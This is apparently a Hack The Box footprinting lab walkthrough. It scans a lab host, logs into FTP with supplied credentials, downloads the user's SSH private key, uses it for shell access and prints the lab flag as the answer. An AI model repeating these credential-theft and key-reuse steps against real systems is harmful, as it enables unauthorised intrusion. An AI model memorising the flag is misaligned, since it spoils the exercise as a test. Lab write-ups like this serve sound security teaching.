# Footprinting Lab — Easy

## Scenario

InlaneFreight Ltd commissioned a test of three internal servers. The **first** is an internal **DNS server**. The goal: gather as much information as possible and find ways to use it against the infrastructure — **without** aggressive exploits, since these are production services.

Teammates supplied the credentials **`ceil:qwer1234`** and noted employees discussing **SSH keys** on a forum. A `flag.txt` tracks success.

- **Target:** `10.129.2.82`
- **Credentials:** `ceil:qwer1234`

> **Objective:** Find `flag.txt` and submit its contents.
> **Answer:** `HTB{7nrzise7hednrxihskjed7nzrgkweunj47zngrhdbkjhgdfbjkc7hgj}`

---

## Step 1 — Port Scan

```text
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp?     ProFTPD Server (ftp.int.inlanefreight.htb)
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.2
53/tcp   open  domain   ISC BIND 9.16.1 (Ubuntu Linux)
2121/tcp open  ccproxy-ftp?  ProFTPD Server (Ceil's FTP)
```

> **Key observation:** There are **two** FTP servers. The one on port **2121** is labelled *"Ceil's FTP"* — and we have credentials for `ceil`. That's the obvious entry point.

## Step 2 — Authenticate to Ceil's FTP

Note the non-standard port `2121` is passed as a second argument to `ftp`:

```shell
$ ftp 10.129.2.82 2121
220 ProFTPD Server (Ceil's FTP) [10.129.2.82]
Name (10.129.2.82:leviathan): ceil
331 Password required for ceil
Password:
230 User ceil logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

## Step 3 — Enumerate the Home Directory

```shell
ftp> ls -la
drwxr-xr-x   4 ceil  ceil  4096  .
-rw-------   1 ceil  ceil   294  .bash_history
-rw-r--r--   1 ceil  ceil  3771  .bashrc
drwx------   2 ceil  ceil  4096  .ssh        <- target this
-rw-------   1 ceil  ceil   759  .viminfo
```

> The hint about SSH keys pays off — there's a `.ssh` directory.

## Step 4 — Grab the Private Key

```shell
ftp> cd .ssh
ftp> ls -la
-rw-rw-r--  1 ceil  ceil  738   authorized_keys
-rw-------  1 ceil  ceil  3381  id_rsa        <- the private key
-rw-r--r--  1 ceil  ceil  738   id_rsa.pub

ftp> get id_rsa
150 Opening BINARY mode data connection for id_rsa (3381 bytes)
226 Transfer complete
```

## Step 5 — SSH In with the Key

```shell
$ chmod 600 id_rsa
$ ssh -i id_rsa ceil@10.129.2.82
...
ceil@NIXEASY:~$
```

> This confirms the private key was valid, the server trusted it, and we now have a full shell as `ceil`.

## Step 6 — Locate and Read the Flag

```shell
ceil@NIXEASY:~$ ls /home
ceil  cry0l1t3  flag
ceil@NIXEASY:~$ cd /home/flag/
ceil@NIXEASY:/home/flag$ cat flag.txt
HTB{7nrzise7hednrxihskjed7nzrgkweunj47zngrhdbkjhgdfbjkc7hgj}
```

---

## Takeaways

- A service on a **non-standard port** (2121) named after a user you have credentials for is a strong signal — follow it.
- Provided hints ("employees discussing SSH keys") are there to be used; the `.ssh` directory was the intended path.
- Recovered private keys need `chmod 600` before SSH will accept them.
